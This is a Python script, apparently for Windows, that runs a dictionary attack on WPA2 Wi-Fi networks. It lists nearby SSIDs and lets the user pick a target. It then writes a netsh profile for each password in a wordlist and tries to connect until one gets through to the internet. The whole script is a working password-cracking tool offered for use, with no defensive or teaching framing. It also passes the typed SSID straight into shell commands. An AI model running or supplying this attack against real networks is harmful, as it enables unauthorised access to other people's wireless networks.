import os, socket, time
from itertools import combinations

Re, Gr, Wh, Ye= '\033[1;31m', '\033[1;32m', '\033[1;37m', '\033[1;33m'
    
def main():
    spin = []

    with open('src/pass.txt', 'r' , encoding='utf-8') as f:
        for r in f:
            r= r.rstrip('\n')
            spin.append(r)

    pope = os.popen('netsh wlan show networks')
    conn = []
    for t in pope:
        r = t.split()
        if 'SSID' in r:
            c = t.split(':')
            name = c[-1].rstrip('\n').lstrip(' ')
            if len(name)>1:
                conn.append(c[-1].rstrip('\n').lstrip(' '))
    for c in conn:
        print(f' {Gr}[*] {c}')

    userinput = input(f'\n{Wh} Type SSID target: {Gr}')

    name_of_file = userinput
    ssid_of_router = userinput

    os.system('cls')

    print(f'{Gr} Trying Passwords.. \n')

    for p in range(len(spin)):

        key_of_router = spin[p]

        config = f"""<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{name_of_file}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid_of_router}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{key_of_router}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""

        with open(f'{name_of_file}.xml', 'w') as file:
            file.write(config)

        os.popen(f'netsh wlan add profile filename="{name_of_file}.xml"')

        os.popen(f"netsh wlan connect name={name_of_file} ssid={ssid_of_router}")

        time.sleep(10)

        try:
            socket.setdefaulttimeout(3)
            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("8.8.8.8", 53))
            ver = True
            os.system('cls')
            print(f' key: {key_of_router} - Connected\n')
            print(f' -- Key successfully found{Wh}')
            os.remove(f'{name_of_file}.xml')
            break
            
        except socket.error as ex:
            ver = False
            print(f' key: {key_of_router} - Failed\n')
            os.popen(f'netsh wlan delete profile name={name_of_file}')
    
    if ver == False:
        print(f' -- Key not found{Wh}')
        os.remove(f'{name_of_file}.xml')



